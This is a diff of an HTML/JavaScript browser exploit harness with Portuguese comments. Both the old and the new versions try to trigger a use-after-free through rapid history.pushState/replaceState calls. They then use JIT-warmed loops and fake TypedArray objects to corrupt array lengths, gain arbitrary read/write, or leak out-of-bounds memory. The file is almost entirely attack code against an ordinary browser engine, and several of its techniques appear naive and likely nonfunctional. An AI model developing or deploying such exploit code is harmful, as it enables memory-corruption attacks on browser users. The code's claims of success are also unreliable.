@@ -1,581 +1,171 @@
 <!DOCTYPE html>
 <html>
-<head>
-<meta charset="UTF-8">
-<title>Timing Correto - Writes DENTRO da Janela UAF</title>
-</head>
+<head><title>Real OOB Test</title></head>
 <body>
-<h1>Mapeamento Corrigido - JIT Writes NA Janela UAF</h1>
-
-<h2>Testes com Timing Correto:</h2>
-<button onclick="testC1()">C1 - Sentinelas + JIT Loop na Janela</button><br><br>
-<button onclick="testC2()">C2 - TypedArray Victim na Janela</button><br><br>
-<button onclick="testC3()">C3 - Mapeamento Preciso na Janela</button><br><br>
-<button onclick="testC4()">C4 - Arbitrary RW na Janela</button><br><br>
-<button onclick="testC5()">C5 - FULL CHAIN Otimizado</button><br><br>
-
+<button onclick="test()">Test Real OOB</button>
 <pre id="log"></pre>
 
 <script>
 const logEl = document.getElementById("log");
 function log(m) { logEl.textContent += m + "\n"; }
-function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
 
-// ========================================
-// UAF TRIGGER
-// ========================================
+const BASE = 977, STEP = 14461, UAF_ITERS = 48;
+
 async function triggerUAF() {
-    log("=== UAF TRIGGER START ===");
-    let size = 977;
-    const STEP = 14461;
-    
-    for(let i = 0; i < 48; i++) {
-        let frag = "A".repeat(size);
-        history.pushState({i: i}, "", "#" + frag);
-        history.replaceState({i: i}, "", "#" + frag.slice(0, frag.length >> 1));
-        
-        if(i % 6 === 0) {
-            setTimeout(() => history.back(), 0);
-        }
-        
-        size += STEP;
-        await sleep(5);
-    }
-    
-    log(">>> UAF WINDOW <<<");
-    await sleep(120);
+  let size = BASE;
+  for(let i=0; i<UAF_ITERS; i++){
+    history.pushState({index:i}, "", "#" + "E".repeat(size));
+    history.replaceState({index:i}, "", "#" + "E".repeat(size >> 1));
+    if(i % 6 === 0) setTimeout(()=>history.back(), 0);
+    size += STEP;
+    await new Promise(r=>setTimeout(r,5));
+  }
+  await new Promise(r=>setTimeout(r,200));
 }
 
-// ========================================
-// JIT SETUP (LOOP INTENSO)
-// ========================================
-function createJITFunction() {
-    // Funcao que sera compilada pelo JIT
-    function jitLoop(arr, startOffset, count, baseValue) {
-        for(let i = 0; i < 10000; i++) {
-            for(let j = 0; j < count; j++) {
-                arr[startOffset + j] = baseValue + j;
-            }
-        }
-    }
-    
-    // Warm up
-    let warmup = new Uint32Array(4);
-    for(let i = 0; i < 100; i++) {
-        jitLoop(warmup, 0, 4, 0x1000);
-    }
-    
-    return jitLoop;
-}
-
-// ========================================
-// TEST C1: SENTINELAS + JIT NA JANELA
-// ========================================
-async function testC1() {
-    logEl.textContent = "";
-    log("=== C1: SENTINELAS + JIT LOOP NA JANELA UAF ===\n");
-    
-    log(">>> PRE-SETUP <<<");
-    
-    // JIT warmup ANTES do UAF
-    let jitLoop = createJITFunction();
-    log("JIT compilado");
-    
-    // Sentinelas ANTES do UAF
-    let before = [];
-    for(let i = 0; i < 100; i++) {
-        before.push({
-            id: i,
-            marker: 0xBEFBEF00 + i,
-            type: "BEFORE",
-            data: [i, i+1, i+2, i+3]
-        });
-    }
-    log("Sentinelas BEFORE criadas: " + before.length);
-    
-    // Trigger UAF
-    await triggerUAF();
-    
-    // DENTRO DA JANELA UAF:
-    log("\n>>> DENTRO DA JANELA UAF <<<");
-    
-    // Criar fake array NA JANELA
-    let fakeArray = {
-        0: 0, 1: 0, 2: 0, 3: 0,
-        length: 65536
-    };
-    log("Fake array criado (length: " + fakeArray.length + ")");
-    
-    // Sentinelas AFTER NA JANELA
-    let after = [];
-    for(let i = 0; i < 100; i++) {
-        after.push({
-            id: i,
-            marker: 0xAFBAFB00 + i,
-            type: "AFTER",
-            data: [i*10, i*10+1, i*10+2, i*10+3]
-        });
-    }
-    log("Sentinelas AFTER criadas: " + after.length);
-    
-    // JIT LOOP INTENSO NA JANELA UAF
-    log("\n>>> EXECUTANDO JIT LOOP (10000 iterations) <<<");
-    
-    let writeOffsets = [100, 500, 1000, 2000, 5000];
-    for(let offset of writeOffsets) {
-        jitLoop(fakeArray, offset, 10, 0xDEAD0000);
-        log("JIT loop at offset " + offset);
-    }
-    
-    log("\n>>> FRAGMENT COLLAPSE <<<");
-    history.replaceState({}, "", "#X");
-    await sleep(50);
-    
-    log("\n>>> VERIFICANDO SENTINELAS <<<");
-    
-    let corrupted = [];
-    
-    for(let i = 0; i < before.length; i++) {
-        if(before[i].marker !== (0xBEFBEF00 + i)) {
-            corrupted.push({
-                type: "BEFORE",
-                id: i,
-                expected: "0x" + (0xBEFBEF00 + i).toString(16),
-                actual: "0x" + before[i].marker.toString(16)
-            });
-        }
-    }
-    
-    for(let i = 0; i < after.length; i++) {
-        if(after[i].marker !== (0xAFBAFB00 + i)) {
-            corrupted.push({
-                type: "AFTER",
-                id: i,
-                expected: "0x" + (0xAFBAFB00 + i).toString(16),
-                actual: "0x" + after[i].marker.toString(16)
-            });
-        }
-    }
-    
-    log("\n>>> RESULTADOS <<<");
-    log("Objetos corrompidos: " + corrupted.length);
-    
-    if(corrupted.length > 0) {
-        log("\n!!! CORRUPCAO DETECTADA !!!");
-        for(let c of corrupted.slice(0, 20)) {
-            log("  " + c.type + "[" + c.id + "]: " + c.expected + " -> " + c.actual);
-        }
-        if(corrupted.length > 20) {
-            log("  ... e mais " + (corrupted.length - 20) + " objetos");
-        }
-    } else {
-        log("Nenhuma corrupcao detectada");
-    }
-    
-    window.__keepC1 = {before, fakeArray, after};
-    log("\n=== FIM C1 ===");
-}
-
-// ========================================
-// TEST C2: TYPEDARRAY VICTIM NA JANELA
-// ========================================
-async function testC2() {
-    logEl.textContent = "";
-    log("=== C2: TYPEDARRAY VICTIM NA JANELA UAF ===\n");
-    
-    log(">>> PRE-SETUP <<<");
-    let jitLoop = createJITFunction();
-    log("JIT compilado");
-    
-    await triggerUAF();
-    
-    log("\n>>> DENTRO DA JANELA UAF <<<");
-    
-    // Criar victim NA JANELA
-    let victim = new Uint32Array(16);
-    for(let i = 0; i < victim.length; i++) {
-        victim[i] = 0x11110000 + i;
-    }
-    
-    log("Victim criado:");
-    log("  length: " + victim.length);
-    log("  victim[0]: 0x" + victim[0].toString(16));
-    
-    // Fake array NA JANELA
-    let fakeArray = {
-        0: 0, 1: 0, 2: 0, 3: 0,
-        length: 65536
-    };
-    log("Fake array criado");
-    
-    // JIT LOOP INTENSO NA JANELA
-    log("\n>>> JIT LOOP TENTANDO ATINGIR VICTIM <<<");
-    
-    for(let baseOffset = 0; baseOffset < 3000; baseOffset += 100) {
-        jitLoop(fakeArray, baseOffset, 50, 0xC0DE0000);
-    }
-    
-    log("JIT loops executados (30 tentativas)");
-    
-    log("\n>>> FRAGMENT COLLAPSE <<<");
-    history.replaceState({}, "", "#X");
-    await sleep(50);
-    
-    log("\n>>> VERIFICANDO VICTIM <<<");
-    log("victim.length: " + victim.length);
-    log("victim.byteLength: " + victim.byteLength);
-    
-    let victimCorrupted = false;
-    for(let i = 0; i < Math.min(victim.length, 16); i++) {
-        let expected = 0x11110000 + i;
-        let actual = victim[i];
-        
-        if(actual !== expected) {
-            log("  victim[" + i + "]: 0x" + actual.toString(16) + " <- CORROMPIDO!");
-            victimCorrupted = true;
-        }
-    }
-    
-    if(victim.length > 16) {
-        log("\n!!! LENGTH INFLADO !!!");
-        log("Tentando arbitrary read:");
-        for(let i = 16; i < Math.min(victim.length, 48); i++) {
-            try {
-                let val = victim[i];
-                if(val !== 0) {
-                    log("  victim[" + i + "] = 0x" + val.toString(16));
-                }
-            } catch(e) {
-                break;
-            }
-        }
-    }
-    
-    if(!victimCorrupted && victim.length === 16) {
-        log("Victim nao corrompido ainda");
-    }
-    
-    window.__keepC2 = {victim, fakeArray};
-    log("\n=== FIM C2 ===");
-}
-
-// ========================================
-// TEST C3: MAPEAMENTO PRECISO NA JANELA
-// ========================================
-async function testC3() {
-    logEl.textContent = "";
-    log("=== C3: MAPEAMENTO PRECISO NA JANELA UAF ===\n");
-    
-    log(">>> PRE-SETUP <<<");
-    let jitLoop = createJITFunction();
-    log("JIT compilado");
-    
-    await triggerUAF();
-    
-    log("\n>>> DENTRO DA JANELA UAF <<<");
-    
-    // Grid de objetos NA JANELA
-    let grid = [];
-    for(let i = 0; i < 20; i++) {
-        let row = [];
-        for(let j = 0; j < 10; j++) {
-            row.push({
-                row: i,
-                col: j,
-                marker: 0x12340000 + (i * 10 + j),
-                data: new Uint32Array([i, j, i+j, i*j])
-            });
-        }
-        grid.push(row);
-    }
-    log("Grid criado: 20x10 = 200 objetos");
-    
-    // Fake array NA JANELA
-    let fakeArray = {
-        0: 0, 1: 0, 2: 0, 3: 0,
-        length: 65536
-    };
-    
-    log("\n>>> JIT LOOPS MAPEADOS <<<");
-    
-    let writeMap = [];
-    for(let i = 0; i < 50; i++) {
-        let offset = 100 + (i * 100);
-        jitLoop(fakeArray, offset, 5, 0xFEED0000 + i);
-        writeMap.push({offset: offset, value: 0xFEED0000 + i});
-    }
-    
-    log("50 JIT loops executados");
-    
-    log("\n>>> FRAGMENT COLLAPSE <<<");
-    history.replaceState({}, "", "#X");
-    await sleep(50);
-    
-    log("\n>>> SCANEANDO GRID <<<");
-    
-    let hits = [];
-    for(let i = 0; i < grid.length; i++) {
-        for(let j = 0; j < grid[i].length; j++) {
-            let obj = grid[i][j];
-            let expectedMarker = 0x12340000 + (i * 10 + j);
-            
-            if(obj.marker !== expectedMarker) {
-                let matchingWrite = null;
-                for(let w of writeMap) {
-                    if((obj.marker & 0xFFFF0000) === (w.value & 0xFFFF0000)) {
-                        matchingWrite = w;
-                        break;
-                    }
-                }
-                
-                hits.push({
-                    row: i,
-                    col: j,
-                    expected: "0x" + expectedMarker.toString(16),
-                    actual: "0x" + obj.marker.toString(16),
-                    write: matchingWrite
-                });
-            }
-        }
-    }
-    
-    log("\n>>> MAPA DE HITS <<<");
-    log("Total de hits: " + hits.length);
-    
-    if(hits.length > 0) {
-        log("\n!!! MAPEAMENTO BEM-SUCEDIDO !!!");
-        for(let h of hits.slice(0, 20)) {
-            let writeInfo = h.write ? 
-                " <- Write offset " + h.write.offset : 
-                " (unknown)";
-            log("Grid[" + h.row + "][" + h.col + "]: " + h.actual + writeInfo);
-        }
-        if(hits.length > 20) {
-            log("  ... e mais " + (hits.length - 20) + " hits");
-        }
-    } else {
-        log("Nenhum hit detectado");
-    }
-    
-    window.__keepC3 = {grid, fakeArray, writeMap};
-    log("\n=== FIM C3 ===");
-}
-
-// ========================================
-// TEST C4: ARBITRARY RW NA JANELA
-// ========================================
-async function testC4() {
-    logEl.textContent = "";
-    log("=== C4: ARBITRARY RW NA JANELA UAF ===\n");
-    
-    log(">>> PRE-SETUP <<<");
-    let jitLoop = createJITFunction();
-    log("JIT compilado");
-    
-    await triggerUAF();
-    
-    log("\n>>> DENTRO DA JANELA UAF <<<");
-    
-    // Victim NA JANELA
-    let victim = new Uint32Array(8);
-    for(let i = 0; i < 8; i++) {
-        victim[i] = 0xAAAA0000 + i;
-    }
-    log("Victim criado (length: " + victim.length + ")");
-    
-    // Fake array NA JANELA
-    let fakeArray = {
-        0: 0, 1: 0, 2: 0, 3: 0,
-        length: 65536
-    };
-    
-    log("\n>>> TENTANDO INFLAR VICTIM.LENGTH <<<");
-    
-    // Estrategia: tentar sobrescrever metadata do TypedArray
-    // TypedArray tem: JSCell header, butterfly, length, buffer pointer
-    // Precisamos atingir o campo "length"
-    
-    for(let attempt = 0; attempt < 100; attempt++) {
-        let offset = attempt * 50;
-        // Tentar escrever valores grandes (potencial length)
-        jitLoop(fakeArray, offset, 10, 0x10000); // 65536
-    }
-    
-    log("100 tentativas de inflacao executadas");
-    
-    log("\n>>> FRAGMENT COLLAPSE <<<");
-    history.replaceState({}, "", "#X");
-    await sleep(50);
-    
-    log("\n>>> VERIFICANDO VICTIM <<<");
-    log("victim.length: " + victim.length);
-    log("victim.byteLength: " + victim.byteLength);
-    
-    if(victim.length > 8) {
-        log("\n!!! LENGTH INFLADO - ARBITRARY READ/WRITE OBTIDO !!!");
-        
-        log("\nArbitrary Read Test:");
-        for(let i = 8; i < Math.min(victim.length, 64); i++) {
-            try {
-                let val = victim[i];
-                if(val !== 0 && val !== undefined) {
-                    log("  victim[" + i + "] = 0x" + val.toString(16));
-                }
-            } catch(e) {
-                break;
-            }
-        }
-        
-        log("\nArbitrary Write Test:");
+async function test() {
+  log("=== REAL OOB TEST ===\n");
+  
+  await triggerUAF();
+  
+  window.addEventListener('popstate', (e) => {
+    if(e.state && e.state.index >= 40) {
+      log("[RACE] Testing REAL OOB...\n");
+      
+      // CRITICAL: Criar REAL TypedArray primeiro
+      log("[1] Creating REAL Uint32Array with known pattern:");
+      const realArray = new Uint32Array(100);
+      for(let i=0; i<100; i++) {
+        realArray[i] = 0xAAAA0000 + i;
+      }
+      log("    Real array[0] = 0x" + realArray[0].toString(16));
+      log("    Real array[99] = 0x" + realArray[99].toString(16));
+      
+      // Criar marker object LOGO APÓS o array (esperando adjacência)
+      log("\n[2] Creating marker object (hoping for adjacency):");
+      const marker = {
+        signature: 0xDEADBEEF,
+        id: 12345,
+        flag: true
+      };
+      log("    marker.signature = 0x" + marker.signature.toString(16));
+      
+      // JIT function
+      function jit_access(arr, idx) {
+        return arr[idx];
+      }
+      
+      // Warm up com REAL array
+      log("\n[3] Warming JIT with REAL TypedArray:");
+      for(let i=0; i<10000; i++) {
+        jit_access(realArray, i % 100);
+      }
+      log("    JIT compiled");
+      
+      // AGORA: Criar fake que IMITA real TypedArray
+      log("\n[4] Creating fake TypedArray:");
+      
+      const fake = {
+        length: 0x10000,
+        byteLength: 0x40000,
+        byteOffset: 0,
+        BYTES_PER_ELEMENT: 4
+      };
+      
+      // Copiar estrutura de Uint32Array
+      Object.setPrototypeOf(fake, Uint32Array.prototype);
+      
+      log("    Fake created with Uint32Array prototype");
+      log("    Fake length: " + fake.length);
+      
+      // CRITICAL TEST: Ler VALORES NÃO INICIALIZADOS
+      log("\n[5] Reading UNINITIALIZED indices:\n");
+      
+      let foundData = false;
+      
+      for(let i=0; i<200; i++) {
         try {
-            victim[100] = 0xDEADBEEF;
-            let readback = victim[100];
-            log("  Write: victim[100] = 0xDEADBEEF");
-            log("  Read:  victim[100] = 0x" + readback.toString(16));
+          const val = jit_access(fake, i);
+          
+          // Se ler algo diferente de undefined/0, pode ser leak!
+          if(val !== undefined && val !== 0 && !isNaN(val)) {
+            log(`    [${i}] = 0x${val.toString(16).padStart(8,'0')}`);
+            foundData = true;
             
-            if(readback === 0xDEADBEEF) {
-                log("\n!!! ARBITRARY READ/WRITE CONFIRMADO !!!");
-                log("!!! PRIMITIVA COMPLETA OBTIDA !!!");
+            // Check se é nosso marker
+            if(val === 0xDEADBEEF) {
+              log(`\n    🚨🚨🚨 FOUND MARKER! 🚨🚨🚨`);
+              log(`    🚨 INFO LEAK CONFIRMED! 🚨`);
             }
+            
+            // Check se é do realArray
+            if((val & 0xFFFF0000) === 0xAAAA0000) {
+              log(`\n    🚨 LEAKED REAL ARRAY DATA! 🚨`);
+            }
+          }
+        } catch(err) {
+          log(`    [${i}] Exception: ${err.message}`);
+          break;
+        }
+      }
+      
+      if(!foundData) {
+        log("    No data leaked (all undefined/0)");
+      }
+      
+      // ALTERNATIVE: Tentar com backing store pointer
+      log("\n[6] Attempting buffer backing store confusion:\n");
+      
+      const buffer = new ArrayBuffer(256);
+      const view = new Uint32Array(buffer);
+      
+      for(let i=0; i<64; i++) {
+        view[i] = 0xBEEF0000 + i;
+      }
+      
+      log("    Real buffer created with pattern");
+      
+      // Criar fake view sem buffer
+      const fakeView = {
+        length: 1000,
+        buffer: buffer,  // Pointing to REAL buffer
+        byteLength: 4000,
+        byteOffset: 0,
+        BYTES_PER_ELEMENT: 4
+      };
+      Object.setPrototypeOf(fakeView, Uint32Array.prototype);
+      
+      // Warm up
+      for(let i=0; i<10000; i++) {
+        jit_access(view, i % 64);
+      }
+      
+      log("\n    Reading via fake view (pointing to real buffer):");
+      
+      for(let i=0; i<100; i++) {
+        try {
+          const val = jit_access(fakeView, i);
+          
+          if(val !== undefined && val !== 0) {
+            log(`      [${i}] = 0x${val.toString(16)}`);
+            
+            if(i >= 64) {
+              log(`        🚨 READ BEYOND REAL BUFFER! (size=64)`);
+            }
+          }
         } catch(e) {
-            log("  Write test error: " + e);
+          log(`      [${i}] ${e.message}`);
+          break;
         }
-        
-    } else {
-        log("Length nao inflado");
-        
-        // Verificar corrupcao parcial
-        let corrupted = false;
-        for(let i = 0; i < 8; i++) {
-            let expected = 0xAAAA0000 + i;
-            let actual = victim[i];
-            if(actual !== expected) {
-                log("  victim[" + i + "]: 0x" + actual.toString(16));
-                corrupted = true;
-            }
-        }
-        
-        if(corrupted) {
-            log("Corrupcao parcial detectada");
-        } else {
-            log("Nenhuma corrupcao detectada");
-        }
+      }
     }
-    
-    window.__keepC4 = {victim, fakeArray};
-    log("\n=== FIM C4 ===");
+  });
+  
+  for(let i=0; i<15; i++) {
+    history.back();
+    await new Promise(r=>setTimeout(r,40));
+  }
 }
-
-// ========================================
-// TEST C5: FULL CHAIN OTIMIZADO
-// ========================================
-async function testC5() {
-    logEl.textContent = "";
-    log("=== C5: FULL CHAIN OTIMIZADO ===\n");
-    log("Estrategia: Todas as tecnicas combinadas\n");
-    
-    log(">>> PRE-SETUP <<<");
-    let jitLoop = createJITFunction();
-    log("JIT compilado");
-    
-    await triggerUAF();
-    
-    log("\n>>> DENTRO DA JANELA UAF <<<");
-    
-    // Multiplos victims
-    let victims = [];
-    for(let i = 0; i < 10; i++) {
-        let v = new Uint32Array(8);
-        for(let j = 0; j < 8; j++) {
-            v[j] = (0xA0000000 + i * 0x1000000) + j;
-        }
-        victims.push(v);
-    }
-    log("10 victim arrays criados");
-    
-    // Fake array
-    let fakeArray = {
-        0: 0, 1: 0, 2: 0, 3: 0,
-        length: 65536
-    };
-    
-    // Sentinelas
-    let sentinels = [];
-    for(let i = 0; i < 50; i++) {
-        sentinels.push({
-            id: i,
-            marker: 0x50505000 + i
-        });
-    }
-    log("50 sentinelas criadas");
-    
-    log("\n>>> JIT ASSAULT (200 tentativas) <<<");
-    
-    for(let i = 0; i < 200; i++) {
-        let offset = i * 25;
-        jitLoop(fakeArray, offset, 10, 0x10000 + i);
-    }
-    
-    log("200 JIT loops executados");
-    
-    log("\n>>> FRAGMENT COLLAPSE <<<");
-    history.replaceState({}, "", "#X");
-    await sleep(50);
-    
-    log("\n>>> ANALISE COMPLETA <<<");
-    
-    // Check victims
-    let inflatedVictims = [];
-    let corruptedVictims = [];
-    
-    for(let i = 0; i < victims.length; i++) {
-        let v = victims[i];
-        
-        if(v.length > 8) {
-            inflatedVictims.push(i);
-        } else {
-            for(let j = 0; j < 8; j++) {
-                let expected = (0xA0000000 + i * 0x1000000) + j;
-                if(v[j] !== expected) {
-                    corruptedVictims.push(i);
-                    break;
-                }
-            }
-        }
-    }
-    
-    // Check sentinels
-    let corruptedSentinels = 0;
-    for(let i = 0; i < sentinels.length; i++) {
-        if(sentinels[i].marker !== (0x50505000 + i)) {
-            corruptedSentinels++;
-        }
-    }
-    
-    log("\n>>> RESULTADOS FINAIS <<<");
-    log("Victims inflados: " + inflatedVictims.length);
-    log("Victims corrompidos: " + corruptedVictims.length);
-    log("Sentinelas corrompidas: " + corruptedSentinels);
-    
-    if(inflatedVictims.length > 0) {
-        log("\n!!! ARBITRARY RW OBTIDO !!!");
-        for(let idx of inflatedVictims) {
-            log("  Victim[" + idx + "].length = " + victims[idx].length);
-        }
-    } else if(corruptedVictims.length > 0 || corruptedSentinels > 0) {
-        log("\n!!! CORRUPCAO DETECTADA !!!");
-        log("Progresso confirmado - refinar offsets");
-    } else {
-        log("\nNenhuma corrupcao detectada");
-    }
-    
-    window.__keepC5 = {victims, fakeArray, sentinels};
-    log("\n=== FIM C5 ===");
-}
-
-log("Testes com timing correto.");
-log("Recomendado: C1 primeiro, depois C3, finalmente C5");
 </script>
-
 </body>
 </html>
